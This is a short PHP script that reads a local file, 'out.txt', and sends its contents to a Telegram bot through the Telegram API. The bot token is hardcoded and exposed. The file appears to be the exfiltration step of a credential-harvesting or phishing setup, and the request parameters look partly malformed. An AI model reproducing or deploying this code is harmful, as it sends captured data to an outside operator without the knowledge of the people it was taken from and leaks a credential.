<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot5541102383:AAGT_brB3s5Y1uD85XveF-uim_75FuQrQps/sendMessage?1463885389=CHATID&text=$msg");
?>